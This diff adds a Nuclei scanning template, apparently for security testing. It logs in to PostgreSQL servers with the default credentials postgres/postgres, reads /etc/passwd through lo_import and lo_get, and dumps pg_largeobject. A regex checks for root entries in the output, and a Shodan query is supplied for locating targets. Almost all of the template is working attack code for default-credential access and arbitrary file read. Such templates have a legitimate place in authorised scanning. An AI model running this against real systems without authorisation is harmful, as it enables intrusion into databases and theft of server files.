@@ -1,0 +1,63 @@
+id: postgresql-exprement
+
+info:
+  name: PGSQL -EXP
+  author: pussycat0x
+  severity: info
+  description: |
+    Read and list the files within the PostgreSQL database,
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-file-read
+  metadata:
+    shodan-query: product:"PostgreSQL"
+  tags: js,network,postgresql
+
+javascript:
+  - code: |
+      const postgres = require('nuclei/postgres');
+      const client = new postgres.PGClient;
+      const flread = "SELECT lo_import('/etc/passwd');"
+      for (let i=0; i < 1; i++){
+        connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, flread);
+        const final = to_json(connected) 
+        const parsedData = JSON.parse(final);
+        const loImportValue = parsedData.Rows[0].lo_import;
+        const valtw = "SELECT lo_get(" + loImportValue +");"
+        const qry = [valtw, "SELECT * from pg_largeobject;"];
+          for (const x of qry){
+          connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, x);
+          Export(connected);
+        }  
+
+      }
+
+      
+
+
+
+    args:
+      Host: "{{Host}}"
+      Port: 5432
+      User: "{{usernames}}"
+      Pass: "{{password}}"
+      Db: "{{database}}"
+
+    payloads:
+      usernames:
+        - postgres
+      database:
+        - postgres
+      password:
+        - postgres
+
+    attack: clusterbomb
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "success == true"
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
